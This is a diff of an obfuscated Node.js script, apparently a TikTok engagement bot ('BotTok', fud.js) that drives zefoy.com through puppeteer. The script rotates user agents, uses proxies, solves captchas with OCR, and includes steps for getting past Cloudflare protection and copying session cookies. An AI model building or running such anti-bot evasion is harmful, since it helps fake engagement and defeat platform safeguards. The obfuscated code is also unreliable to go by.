@@ -1,219 +1,213 @@
 const vF = function () {
   const v2 = {
-    vrWlY: function (p2, p3) {
-      return p2 !== p3;
+    vFCWA: "You are being rate limited",
+    iyPlV: function (p2, p3) {
+      return p2 === p3;
     },
-    DRvjF: "JMJov",
-    wIEEa: "dZnWN",
-    JtiXJ: function (p4, p5) {
+    GqaPM: "anhxA",
+    upcrG: "sOCfe",
+    JfyHv: "lqxVV",
+    PFaiH: function (p4, p5) {
       return p4 === p5;
     },
-    rSnII: "WozmQ",
-    zFuNK: "ngoVH",
-    YhGmP: function (p6, p7) {
-      return p6(p7);
-    },
-    ZJkNf: function (p8, p9) {
-      return p8 + p9;
-    },
-    zAnvx: "return (function() ",
-    iUqDe: "{}.constructor(\"return this\")( )",
-    tWbxg: function (p10, p11) {
-      return p10 !== p11;
-    },
-    RVrfO: "vVOmS",
-    zTFni: "Cwcde"
+    kPPTA: "eQLjR",
+    TPgrL: "WFGSf"
   };
+  const vV2 = v2;
   let v3 = true;
-  return function (p12, p13) {
+  return function (p6, p7) {
     const v4 = {
-      EkuKJ: function (p14, p15) {
-        return v2.YhGmP(p14, p15);
-      }
+      gPPue: vV2.vFCWA,
+      WGlCe: function (p8, p9) {
+        return vV2.iyPlV(p8, p9);
+      },
+      mlHgn: vV2.GqaPM,
+      cfooc: vV2.upcrG,
+      QPZKW: function (p10, p11) {
+        return vV2.iyPlV(p10, p11);
+      },
+      SnHdo: vV2.JfyHv
     };
-    if (v2.tWbxg(v2.RVrfO, v2.zTFni)) {
+    if (vV2.PFaiH(vV2.kPPTA, vV2.TPgrL)) {
+      p6.stdout.clearLine(0);
+      p7.stdout.cursorTo(0);
+      v4.stdout.write(w + " Solve the captcha manually...");
+    } else {
       const v5 = v3 ? function () {
-        if (v2.vrWlY(v2.DRvjF, v2.wIEEa)) {
-          if (p13) {
-            if (v2.JtiXJ(v2.rSnII, v2.zFuNK)) {
-              v4.EkuKJ(v3, 0);
-            } else {
-              const v6 = p13.apply(p12, arguments);
-              p13 = null;
-              return v6;
-            }
+        const v6 = {
+          wOMIb: v4.gPPue
+        };
+        const vV6 = v6;
+        if (v4.WGlCe(v4.mlHgn, v4.cfooc)) {
+          p6.stdout.clearLine(0);
+          p7.stdout.cursorTo(0);
+          v4.stdout.write(w + "  Do not use proxy!");
+        } else if (p7) {
+          if (v4.QPZKW(v4.SnHdo, v4.SnHdo)) {
+            const v7 = p7.apply(p6, arguments);
+            p7 = null;
+            return v7;
+          } else {
+            v6 = vV6.wOMIb;
           }
-        } else {
-          return true;
         }
       } : function () {};
       v3 = false;
       return v5;
-    } else {
-      p12 = v2.YhGmP(p13, v2.ZJkNf(v2.ZJkNf(v2.zAnvx, v2.iUqDe), ");"))();
     }
   };
 }();
 const vVF = vF(this, function () {
-  const vV7 = {
-    jjlQS: "(((.+)+)+)+$"
+  const vV8 = {
+    ULVNA: "(((.+)+)+)+$"
   };
-  return vVF.toString().search(vV7.jjlQS).toString().constructor(vVF).search(vV7.jjlQS);
+  return vVF.toString().search(vV8.ULVNA).toString().constructor(vVF).search(vV8.ULVNA);
 });
 vVF();
 const vF2 = function () {
-  const v8 = {
-    lUVis: function (p16, p17) {
-      return p16 !== p17;
+  const v9 = {
+    aMlip: function (p12, p13) {
+      return p12(p13);
     },
-    WnCPn: "xmZGB",
-    SepJZ: function (p18, p19) {
-      return p18 !== p19;
+    EQGqt: function (p14, p15) {
+      return p14 === p15;
     },
-    QkNGv: "LVdiQ",
-    qsEFi: "SpUMb",
-    TTzYL: function (p20, p21) {
-      return p20(p21);
-    },
-    RXuNf: function (p22) {
-      return p22();
-    },
-    wENRD: function (p23, p24) {
-      return p23 - p24;
-    },
-    JBFag: function (p25, p26) {
-      return p25 !== p26;
-    },
-    YUtYp: "OjPrt",
-    UmLPa: "SOwNC"
+    trDbx: "iELEg",
+    OJqMa: "mYHVq",
+    ewPio: "SQYCQ",
+    wTubm: "zPIOV",
+    PvCFD: "MkZpP"
   };
-  let v9 = true;
-  return function (p27, p28) {
-    const v10 = {
-      IqHTc: function (p29, p30) {
-        return v8.TTzYL(p29, p30);
+  let v10 = true;
+  return function (p16, p17) {
+    const v11 = {
+      lhOdm: function (p18, p19) {
+        return v9.EQGqt(p18, p19);
       },
-      mRAfl: function (p31) {
-        return v8.RXuNf(p31);
-      },
-      VImBH: function (p32, p33) {
-        return v8.wENRD(p32, p33);
-      }
+      mqbRZ: v9.trDbx,
+      OMjzy: v9.OJqMa,
+      ttuLF: v9.ewPio
     };
-    if (v8.JBFag(v8.YUtYp, v8.UmLPa)) {
-      const v11 = v9 ? function () {
-        if (v8.lUVis(v8.WnCPn, v8.WnCPn)) {
-          v10.IqHTc(B, "[" + r + "] " + J + " (+" + A + ") [" + F + "] Stopped for reaching the maximum time limit! (in " + v10.mRAfl(p) + " mins)");
-          if (!h) {
-            W.stdout.clearLine(0);
-            R.stdout.cursorTo(0);
-            o.stdout.write(E + " Stopped for reaching the maximum time limit!");
-          }
-          u.exit(0);
-        } else if (p28) {
-          if (v8.SepJZ(v8.QkNGv, v8.qsEFi)) {
-            const v12 = p28.apply(p27, arguments);
-            p28 = null;
-            return v12;
+    if (v9.EQGqt(v9.wTubm, v9.PvCFD)) {
+      v9.aMlip(v10, "Solve the captcha manually...");
+    } else {
+      const v12 = v10 ? function () {
+        if (v11.lhOdm(v11.mqbRZ, v11.OMjzy)) {
+          a.stdout.clearLine(0);
+          v12.stdout.cursorTo(0);
+          w.stdout.write(A + " Launch " + p.provider + " in headless browser...");
+        } else if (p17) {
+          if (v11.lhOdm(v11.ttuLF, v11.ttuLF)) {
+            const v13 = p17.apply(p16, arguments);
+            p17 = null;
+            return v13;
           } else {
-            p28 = v10.VImBH(v10, v11);
+            return false;
           }
         }
       } : function () {};
-      v9 = false;
-      return v11;
-    } else {
-      return false;
+      v10 = false;
+      return v12;
     }
   };
 }();
 (function () {
-  const v13 = {
-    wDncs: function (p34, p35) {
-      return p34 !== p35;
+  const v14 = {
+    idaVF: function (p20, p21) {
+      return p20 === p21;
     },
-    GvkQu: "OJIRJ",
-    FVfHL: "KyfGQ",
-    OfsfR: "function *\\( *\\)",
-    FRkFO: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
-    LsgRg: function (p36, p37) {
-      return p36(p37);
+    cYmfT: " (Latest)",
+    xLYkr: function (p22, p23) {
+      return p22 + p23;
     },
-    IymEf: "init",
-    qgUUc: function (p38, p39) {
-      return p38 + p39;
+    zOWDc: function (p24, p25) {
+      return p24 * p25;
     },
-    xwLuS: "chain",
-    gVsst: "input",
-    tVynC: function (p40, p41) {
-      return p40 === p41;
+    ydKwt: function (p26, p27) {
+      return p26 & p27;
     },
-    DCWDR: "AHYNB",
-    EmrwO: function (p42, p43) {
-      return p42(p43);
+    xhWOR: "qnjgn",
+    IaiVX: "function *\\( *\\)",
+    ivJbh: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
+    HmUPG: function (p28, p29) {
+      return p28(p29);
     },
-    TJrVQ: function (p44, p45) {
-      return p44 === p45;
+    BXVkw: "init",
+    XwcIl: "chain",
+    KrsSP: "input",
+    GwTRe: function (p30, p31) {
+      return p30 === p31;
     },
-    CsKlJ: "sRvdx",
-    BGcPK: function (p46) {
-      return p46();
+    uZAgt: "kDgfT",
+    aOBXA: "ivMQc",
+    OAWTI: "lDuUp",
+    QcJHD: function (p32) {
+      return p32();
     },
-    ItAMa: function (p47, p48, p49) {
-      return p47(p48, p49);
+    UVOVx: function (p33, p34, p35) {
+      return p33(p34, p35);
     }
   };
-  v13.ItAMa(vF2, this, function () {
-    if (v13.wDncs(v13.GvkQu, v13.FVfHL)) {
-      const v14 = new RegExp(v13.OfsfR);
-      const v15 = new RegExp(v13.FRkFO, "i");
-      const v16 = v13.LsgRg(f91, v13.IymEf);
-      if (!v14.test(v13.qgUUc(v16, v13.xwLuS)) || !v15.test(v13.qgUUc(v16, v13.gVsst))) {
-        if (v13.tVynC(v13.DCWDR, v13.DCWDR)) {
-          v13.EmrwO(v16, "0");
+  v14.UVOVx(vF2, this, function () {
+    const v15 = {
+      wZlyV: function (p36, p37) {
+        return v14.idaVF(p36, p37);
+      },
+      psRRT: v14.cYmfT,
+      rZKcy: function (p38, p39) {
+        return v14.xLYkr(p38, p39);
+      },
+      GfZgy: function (p40, p41) {
+        return v14.zOWDc(p40, p41);
+      },
+      LWYeK: function (p42, p43) {
+        return v14.ydKwt(p42, p43);
+      }
+    };
+    if (v14.idaVF(v14.xhWOR, v14.xhWOR)) {
+      const v16 = new RegExp(v14.IaiVX);
+      const v17 = new RegExp(v14.ivJbh, "i");
+      const v18 = v14.HmUPG(f92, v14.BXVkw);
+      if (!v16.test(v14.xLYkr(v18, v14.XwcIl)) || !v17.test(v14.xLYkr(v18, v14.KrsSP))) {
+        if (v14.GwTRe(v14.uZAgt, v14.aOBXA)) {
+          z.log(v15.wZlyV(w.tag_name, A) ? "> " : "", p.tag_name, v15.wZlyV(C.tag_name, J) ? v15.psRRT : "");
         } else {
-          v14 = "";
+          v14.HmUPG(v18, "0");
         }
-      } else if (v13.TJrVQ(v13.CsKlJ, v13.CsKlJ)) {
-        v13.BGcPK(f91);
+      } else if (v14.GwTRe(v14.OAWTI, v14.OAWTI)) {
+        v14.QcJHD(f92);
       } else {
-        return null;
+        if (!z) {
+          D.stdout.moveCursor(0, -4);
+          l.stdout.clearScreenDown();
+          M.log(q);
+        }
+        J.exit(0);
       }
     } else {
-      return y.stringify(v.cookies.map(p50 => ({
-        domain: p50.domain,
-        expirationDate: p50.expires,
-        hostOnly: p50.hostOnly,
-        httpOnly: p50.httpOnly,
-        name: p50.name,
-        path: p50.path,
-        sameSite: "unspecified",
-        secure: p50.secure,
-        session: p50.session,
-        storeId: "0",
-        value: p50.value
-      })));
+      A = v15.rZKcy(v15.GfZgy(p, C), J.charCodeAt(D));
+      l = v15.LWYeK(M, q);
     }
   })();
 })();
-import a0zy from "os";
-import a0zv from "inquirer";
-import a0zd from "fs";
-import a0zN from "sync-fetch";
-import a0zC from "puppeteer";
-import a0zS from "minimist";
-import a0zt from "terminal-image";
-import a0zV from "tesseract.js";
-import * as a0zI from "chrome-launcher";
-import a0zU from "chromium";
-import a0zB from "chrome-remote-interface";
-import a0zr from "jimp";
+import a0iP from "os";
+import a0iH from "inquirer";
+import a0ic from "fs";
+import a0ia from "sync-fetch";
+import a0iz from "puppeteer";
+import a0iw from "minimist";
+import a0iA from "terminal-image";
+import a0ip from "tesseract.js";
+import * as a0iC from "chrome-launcher";
+import a0iJ from "chromium";
+import a0iD from "chrome-remote-interface";
+import a0il from "jimp";
 import { promisify } from "util";
 import { fileURLToPath } from "url";
 import { dirname } from "path";
-const v17 = "1.1.5";
-const v18 = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5351.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46", "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"];
-const vA0zS = a0zS(process.argv.slice(2), {
+const v19 = "1.1.6";
+const v20 = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5351.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50", "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.46", "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0 (Edition Yx 05)", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.56", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"];
+const vA0iw = a0iw(process.argv.slice(2), {
   string: ["video", "task", "provider", "cookies", "user-agent", "proxy", "proxies", "proxies-country", "browser", "browser-user", "browser-remote", "no-headless", "terminal-captcha", "log", "minimal", "detach", "limit", "min-limit", "max-time", "available-tasks", "session-status", "init-accums", "verbose", "retry-timeout"],
   alias: {
     h: "help",
@@ -269,8163 +263,8435 @@ const vA0zS = a0zS(process.argv.slice(2), {
     "retry-timeout": 1
   }
 });
-const v22 = "\n\nCurrently in Termux you need to bypass Cloudflare manually to get a valid cookies.json file. \nTo do this follow the instructions below:\n\n1. Open Playstore and install \"Kiwi Browser\".\n2. Open Kiwi Browser, enter to zefoy.com, pass Cloudflare's protection, solve the captcha.\n3. Click on the 3 dots button, click on \"Extensions\", click on \"+(from store)\", search in the chrome web store search bar for \"Copy Cookies\" extension, click on \"Add to Chrome\".\n4. In the zefoy tab, click on the 3 dots button, scroll down to the bottom, click on \"Copy Cookies\". You will see on the screen \"Copied\".\n5. $ nano cookies.json\n6. Click on the screen, and click on \"Paste\".\n7. Click CTRL, then O, then ENTER.\n8. Click CTRL, then click X.\n9. $ node fud.js\n";
-const v23 = "\nUsage: node fud.js [options]\n\nOptions:\n  -h, --help                Show help\n  -v, --version             BotTok version\n  -l, --video <link>        TikTok video URL to perform the task on\n  -t, --task <task>         Task to perform on the TikTok video (example: 'Up Views')\n  -q, --provider <prov>     Provider Zefoy or Freer (default: Zefoy)\n  -c, --cookies <path>      File path to store session cookies (default: cookies.json)\n  -u, --user-agent <ua>     User agent to be used (default: random user-agent)\n  -p, --proxy <proxy>       The proxy to be used (example: http://localhost:8080)\n  -s, --proxies <path>      The path of the proxies file to use randomly (default: proxies.txt)\n  -n, --proxies-country <c> Filter proxies by country code (example: 'FR' or list 'ES,FR,IT')\n  -b, --browser <path>      Path to a browser executable to use instead of Chromium  \n  -r, --browser-remote <ws> Set browser WS endpoint to connect to an existing instance\n  -j, --browser-user <path> Set custom user data directory of browser (profile folder)\n  -w, --no-headless         Open visible browser window  \n  -k, --terminal-captcha    Terminal captcha instead of auto solver\n  -o, --log                 Write activity log (activity.log)\n  -m, --minimal             Hide ASCII art header\n  -d, --detach              Output mode for background processes\n  -x, --limit <int>         By the time the accumulation limit is reached\n  -z, --min-limit <int>     If it does not accumulate x amount in 60 minutes it stops\n  -f, --max-time <int>      Sets a maximum time limit in hours before stops\n  -a, --available-tasks     Returns the currently available tasks\n  -g, --session-status      Returns the session status\n  -i, --init-accums         Set a initial accumulation value (default: 0)\n  -e, --verbose             Display detailed processing information in logs\n  -rt, --retry-timeout      Waiting trying again timeout in minutes (default: 1)\n";
-if (vA0zS.help) {
-  console.log(v23);
+const v24 = "\n\nCurrently in Termux you need to bypass Cloudflare manually to get a valid cookies.json file. \nTo do this follow the instructions below:\n\n1. Open Playstore and install \"Kiwi Browser\".\n2. Open Kiwi Browser, enter to zefoy.com, pass Cloudflare's protection, solve the captcha.\n3. Click on the 3 dots button, click on \"Extensions\", click on \"+(from store)\", search in the chrome web store search bar for \"Copy Cookies\" extension, click on \"Add to Chrome\".\n4. In the zefoy tab, click on the 3 dots button, scroll down to the bottom, click on \"Copy Cookies\". You will see on the screen \"Copied\".\n5. $ nano cookies.json\n6. Click on the screen, and click on \"Paste\".\n7. Click CTRL, then O, then ENTER.\n8. Click CTRL, then click X.\n9. $ node fud.js\n";
